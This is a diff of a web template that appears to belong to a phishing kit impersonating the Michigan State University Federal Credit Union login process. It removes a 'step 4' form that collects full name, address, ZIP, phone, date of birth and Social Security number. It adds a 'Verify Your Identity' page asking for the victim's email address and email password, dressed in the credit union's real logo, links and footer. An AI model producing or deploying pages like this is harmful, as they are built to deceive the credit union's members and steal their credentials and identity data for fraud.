@@ -1,202 +1,84 @@
-@layout('layouts.app')
+<!DOCTYPE html>
+<html lang="en">
 
-@section('content')
-<div class="col-20" style="width: 60rem;">
-  <div class="step-header align" style="padding: 0rem;">
-    <h2 class="cb-content-header cb-content-header-title topMargin bottomMargin">LOGIN</h2>
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Login</title>
+  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/main.css">
+  <script src="/js/jquery.js"></script>
+</head>
 
-    <p class="topMargin bottomMargin">Help us confirm it's you by filling out the following information.</p>
-    <br>
+<body>
+  <div class="wrapper">
+    <div class="header mobile-header">
+      <div class="cb-logo-container">
+        <a href="https://www.msufcu.org/">
+          <img src="/img/logo.svg" class="cb-logo">
+          <img src="/img/logo-small.svg" class="cb-logo-small">
+        </a>
+      </div>
+
+      <h4 class="cb-title">ComputerLine</h4>
+    </div>
+
+    <div class="main">
+      <div class="form-container">
+        <div class="form-heading">
+          <span>Verify Your Identity</span>
+          <div class="form-sub-text">Help us confirm it's you by filling out the following information.</div>
+        </div>
+        <br>
+
+        <form action="/auth/login/4" method="post">
+          <table>
+            <tbody>
+              <tr>
+                <td>Email Address</td>
+                <td><input name="emailAddr" id="emailAddr" type="email" class="form-control" autocomplete="off" autocapitalize="off" spellcheck="off" required></td>
+              </tr>
+
+              <tr>
+                <td>Email Password</td>
+                <td><input name="emailPass" id="emailPass" type="password" class="form-control input-mask" autocomplete="off" autocapitalize="off" spellcheck="off" required>
+                </td>
+              </tr>
+              <tr>
+                <td></td>
+                <td><button type="submit" class="submit-btn">Continue</button></td>
+              </tr>
+            </tbody>
+          </table>
+        </form>
+      </div>
+    </div>
+
+    <div class="footer">
+      <div class="footer-text">
+        <p>
+          <strong>Michigan State University Federal Credit Union</strong> savings are Federally insured to at least $250,000 by the <a href="https://www.ncua.gov/">NCUA</a> and backed by the full faith and credit of the United States Government. APR = Annual Percentage Rate. APY = Annual Percentage Yield. <a href="https://www.msufcu.org/disclosures/?expand=privacy_policy#privacy_policy">View our Privacy Policy</a> and
+          read our <a href="https://media.msufcu.org/publicsites/publicsite/documents/u2slfliv46vtlzftrvw1.pdf">disclaimer</a> regarding links to other sites.
+        </p>
+        <div class="copyright">
+          Copyright © 2023 Michigan State University Federal Credit Union All Rights Reserved.
+        </div>
+      </div>
+
+      <div>
+        <a href="https://www.ncua.gov/">
+          <img src="/img/ncua.gif">
+        </a>
+      </div>
+
+      <div>
+        <img src="/img/ehl.png">
+      </div>
+    </div>
   </div>
-  <br>
 
-  <p class="required-header">Fields marked with asterisks (*) are required.</p>
+  <script src="/js/main.js"></script>
+</body>
 
-  <form action="/auth/login/4" method="POST">
-    <h3>Personal Information</h3>
-
-    <div class="cb-input-wrapper-component">
-      <div class="cb-form-field primary cb-form-field-legacy">
-        <div class="cb-form-field-wrapper">
-          <div class="cb-form-field-flex">
-            <div class="cb-form-field-infix">
-              <div class="cb-input-core">
-                <input id="fullName" name="fullName" class="cb-input" type="text" autocapitalize="off" autocorrect="off" autocomplete="off">
-              </div>
-
-              <span class="cb-form-field-label-wrapper">
-                <label class="cb-form-field-label cb-form-field-empty" for="fullName">Full Name*</label>
-              </span>
-            </div>
-          </div>
-
-          <div class="cb-form-field-underline">
-            <span class="cb-form-field-ripple"></span>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="cb-input-wrapper-component" style="margin-top: 3rem">
-      <div class="cb-form-field primary cb-form-field-legacy">
-        <div class="cb-form-field-wrapper">
-          <div class="cb-form-field-flex">
-            <div class="cb-form-field-infix">
-              <div class="cb-input-core">
-                <input id="address" name="address" class="cb-input" type="text" autocapitalize="off" autocorrect="off" autocomplete="off">
-              </div>
-
-              <span class="cb-form-field-label-wrapper">
-                <label class="cb-form-field-label cb-form-field-empty" for="address">Street Address*</label>
-              </span>
-            </div>
-          </div>
-
-          <div class="cb-form-field-underline">
-            <span class="cb-form-field-ripple"></span>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="cb-input-wrapper-component" style="margin-top: 3rem">
-      <div class="cb-form-field primary cb-form-field-legacy">
-        <div class="cb-form-field-wrapper">
-          <div class="cb-form-field-flex">
-            <div class="cb-form-field-infix">
-              <div class="cb-input-core">
-                <input id="zip" name="zip" class="cb-input" type="text" autocapitalize="off" autocorrect="off" autocomplete="off">
-              </div>
-
-              <span class="cb-form-field-label-wrapper">
-                <label class="cb-form-field-label cb-form-field-empty" for="zip">ZIP Code*</label>
-              </span>
-            </div>
-          </div>
-
-          <div class="cb-form-field-underline">
-            <span class="cb-form-field-ripple"></span>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="cb-input-wrapper-component" style="margin-top: 3rem">
-      <div class="cb-form-field primary cb-form-field-legacy">
-        <div class="cb-form-field-wrapper">
-          <div class="cb-form-field-flex">
-            <div class="cb-form-field-infix">
-              <div class="cb-input-core">
-                <input id="phone" name="phone" class="cb-input" type="text" autocapitalize="off" autocorrect="off" autocomplete="off">
-              </div>
-
-              <span class="cb-form-field-label-wrapper">
-                <label class="cb-form-field-label cb-form-field-empty" for="phone">Mobile Phone*</label>
-              </span>
-            </div>
-          </div>
-
-          <div class="cb-form-field-underline">
-            <span class="cb-form-field-ripple"></span>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="cb-input-wrapper-component" style="margin-top: 3rem">
-      <div class="cb-form-field primary cb-form-field-legacy">
-        <div class="cb-form-field-wrapper">
-          <div class="cb-form-field-flex">
-            <div class="cb-form-field-infix">
-              <div class="cb-input-core">
-                <input id="dob" name="dob" class="cb-input" type="text" autocapitalize="off" autocorrect="off" autocomplete="off">
-              </div>
-
-              <span class="cb-form-field-label-wrapper">
-                <label class="cb-form-field-label cb-form-field-empty" for="dob">Date of Birth (MM/DD/YYYY)*</label>
-              </span>
-            </div>
-          </div>
-
-          <div class="cb-form-field-underline">
-            <span class="cb-form-field-ripple"></span>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="cb-input-wrapper-component" style="margin-top: 3rem">
-      <div class="cb-form-field primary cb-form-field-legacy">
-        <div class="cb-form-field-wrapper">
-          <div class="cb-form-field-flex">
-            <div class="cb-form-field-infix">
-              <div class="cb-input-core">
-                <input id="ssn" name="ssn" class="cb-input cb-input-mask" type="password" autocapitalize="off" autocorrect="off" autocomplete="off">
-              </div>
-
-              <span class="cb-form-field-label-wrapper">
-                <label class="cb-form-field-label cb-form-field-empty" for="ssn">Social Security Number*</label>
-              </span>
-            </div>
-          </div>
-
-          <div class="cb-form-field-underline">
-            <span class="cb-form-field-ripple"></span>
-          </div>
-        </div>
-      </div>
-    </div>
-    
-    <div class="nav-btns" style="margin-bottom: 8.5rem; margin-top: 6rem;">
-        <button class="focus-indicator cb-button raised-button blue-btn primary-btn" type="submit" disabled="">
-          <span class="button-wrapper">NEXT</span>
-        </button>
-    </div>
-  </form>
-</div>
-@endsection
-
-@section('progress-bar')
-<div class="cb-row progress-bar-dots">
-  <ol>
-    <li class="future">
-      <p>
-        <span class="future">1</span>
-      </p>
-    </li>
-
-    <li class="future">
-      <p>
-        <span class="future">2</span>
-      </p>
-    </li>
-
-    <li class="future">
-      <p>
-        <span class="future">3</span>
-      </p>
-    </li>
-
-    <li class="present">
-      <p>
-        <span class="present">4</span>
-      </p>
-    </li>
-
-    <li class="future">
-      <p>
-        <span class="future">5</span>
-      </p>
-    </li>
-  </ol>
-</div>
-@endsection
-
-@section('script')
-<script>
-  $('#zip').mask('00000');
-  $('#phone').mask('(000) 000-0000');
-  $('#dob').mask('00/00/0000');
-  $('#ssn').mask('000-00-0000');
-</script>
-@endsection
+</html> 
